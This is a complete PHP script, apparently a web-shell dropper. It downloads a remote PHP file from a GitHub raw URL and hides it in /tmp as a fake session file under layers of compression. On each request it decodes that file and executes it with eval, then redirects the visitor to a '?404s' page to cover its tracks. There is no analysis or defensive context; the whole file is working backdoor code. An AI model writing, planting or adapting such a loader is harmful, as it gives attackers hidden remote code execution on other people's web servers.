<?php
$URL = 'https://raw.githubusercontent.com/Liong365/pr/main/pdf.php';
$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php';
 
function M() {
    $FGT = @gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(file_get_contents($GLOBALS['URL'])))))));
    if(!$FGT) {
        echo `curl -k $(echo {$GLOBALS[gzcompress]($GLOBALS[gzdeflate]($GLOBALS[gzcompress]($GLOBALS[gzdeflate]($GLOBALS[gzcompress]($GLOBALS[gzdeflate](file_get_contents($GLOBALS['URL'])))))))}) > {$GLOBALS['TMP']}`;
    } else {
        $HANDLE = fopen($GLOBALS['TMP'], 'w');
        fwrite($HANDLE, $FGT);
        fclose($HANDLE);
    }
    echo '<script>window.location="?404s";</script>';
}
 
if(file_exists($TMP)) {
    if(filesize($TMP) === 0) {
        unlink($TMP);
        M();
    } else {
	$B64 = gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(file_get_contents($TMP)))))));
        @eval("?>".$B64);
    }
} else {
    M();
}
?>
